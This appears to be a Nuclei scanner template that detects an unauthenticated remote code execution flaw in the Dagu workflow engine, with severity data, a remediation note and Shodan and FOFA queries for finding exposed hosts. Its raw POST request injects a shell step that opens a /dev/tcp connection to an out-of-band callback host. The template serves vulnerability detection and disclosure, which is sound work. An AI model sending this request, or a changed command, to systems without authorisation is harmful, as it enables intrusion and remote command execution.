http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "dagRunId")
    - contains(content_type, "application/json")
    - contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /api/v2/dag-runs HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c
    ''echo vt > /dev/tcp/{{interactsh-url}}/80''\n"}

    '
id: dagu-rce
info:
  author: omarkurt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
  description: 'Dagu (<= 1.30.3) ships with authentication disabled by default. The
    POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and immediately
    executes shell commands without credentials.

    '
  metadata:
    fofa-query: title="Dagu"
    max-request: 1
    product: dagu
    runzero-match: any(each(service["html.titles"]), {# matches "Dagu"})
    shodan-query: title:"Dagu"
    vendor: dagu-org
    verified: true
  name: Dagu Workflow Engine - Remote Code Execution
  reference:
  - https://github.com/dagu-org/dagu
  - https://vulnerabletarget.com/vt-dagu
  - https://github.com/advisories/GHSA-6qr9-g2xw-cw92
  remediation: Upgrade to a patched version.
  severity: critical
  tags: dagu,rce,oob,unauth,vuln
variables:
  dag_name: '{{rand_text_alphanumeric(8)}}'
